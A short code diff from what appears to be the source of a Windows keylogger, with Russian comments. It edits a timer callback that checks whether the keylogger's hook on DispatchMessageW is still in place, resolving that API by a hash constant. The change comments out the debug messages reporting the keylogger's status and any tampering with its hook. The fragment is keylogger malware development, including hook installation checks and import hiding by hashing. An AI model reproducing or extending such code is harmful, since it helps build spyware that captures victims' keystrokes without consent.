@@ -1315,16 +1315,16 @@ VOID CALLBACK TestTimerProc(HWND, UINT, UINT_PTR, DWORD)
 {
 	// Выводим сообщение о рабете кейлогера
 	PKeyLogger L = GetLogger(true);
-	if (L)
-		KLGDBG("---- UnKLG", "Кейлогер работает");
-	else
-    	KLGDBG("---- UnKLG", "Кейлогер отключен");
+//	if (L)
+//		KLGDBG("---- UnKLG", "Кейлогер работает");
+//	else
+//    	KLGDBG("---- UnKLG", "Кейлогер отключен");
 
 	const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
 
 	LPVOID ProcAddr = GetProcAddressEx(NULL, 3, Hash_DispatchMessageW );
-	if (ProcAddr != &KeyLoggerHooks::Hook_DispatchMessageW)
-		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
+//	if (ProcAddr != &KeyLoggerHooks::Hook_DispatchMessageW)
+//		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
 
 }
 
